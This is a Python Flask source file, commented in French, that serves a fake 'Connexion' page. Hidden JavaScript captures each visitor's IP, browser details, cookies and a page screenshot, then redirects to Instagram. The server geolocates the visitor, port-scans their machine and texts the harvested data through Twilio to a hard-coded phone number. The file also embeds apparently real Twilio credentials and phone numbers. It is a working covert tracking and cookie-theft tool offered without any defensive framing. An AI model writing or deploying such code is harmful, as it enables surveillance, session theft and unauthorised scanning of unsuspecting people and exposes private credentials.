import socket
import os
import requests
from flask import Flask, request, jsonify
from twilio.rest import Client

app = Flask(__name__)

# Configuration Twilio
account_sid = os.getenv('AC2ef2bd5bd5146f76f586d2c577159f90') or 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = os.getenv('ab95f4ee6a016c23b123670550a6cde7') or 'ab95f4ee6a016c23b123670550a6cde7'
from_number = os.getenv('+12524866318') or '+12524866318'
to_number = os.getenv('+33635960569') or '+33635960569'

client = Client(account_sid, auth_token)

# Géolocalisation via IP
def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
    except:
        return "Localisation impossible"

# Scan des ports
def scan_ports(ip, ports=[22, 80, 443, 8080]):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            continue
    return open_ports

# Envoi SMS Twilio
def send_sms(details):
    try:
        message = client.messages.create(
            body=details,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur SMS : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Connexion</title></head>
    <body>
        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
        <script>
            const startTime = Date.now();

            function sendData(ip) {
                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL("image/png");

                    const details = {
                        ip: ip,
                        ua: navigator.userAgent,
                        screen: window.screen.width + "x" + window.screen.height,
                        lang: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        screenshot: screenshot,
                        timeSpent: Math.floor((Date.now() - startTime) / 1000),
                        cookies: document.cookie
                    };

                    fetch("/log", {
                        method: "POST",
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(details)
                    }).then(() => {
                        window.location.href = "https://instagram.com";
                    });
                });
            }

            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => sendData(data.ip));
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    resolution = data.get('screen')
    lang = data.get('lang')
    timezone = data.get('timezone')
    screenshot = data.get('screenshot')[:100] + '...'
    time_spent = data.get('timeSpent')
    cookies = data.get('cookies')

    location = get_geolocation(ip)
    ports = scan_ports(ip)

    details = (
        f"[Info]\n"
        f"IP : {ip}\n"
        f"Localisation : {location}\n"
        f"Ports : {ports if ports else 'Aucun'}\n"
        f"User-Agent : {user_agent}\n"
        f"Langue : {lang} | Fuseau : {timezone}\n"
        f"Resolution : {resolution} | Temps sur la page : {time_spent}s\n"
        f"Cookies : {cookies[:100]}...\n"
        f"Screenshot : {screenshot}"
    )

    send_sms(details)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
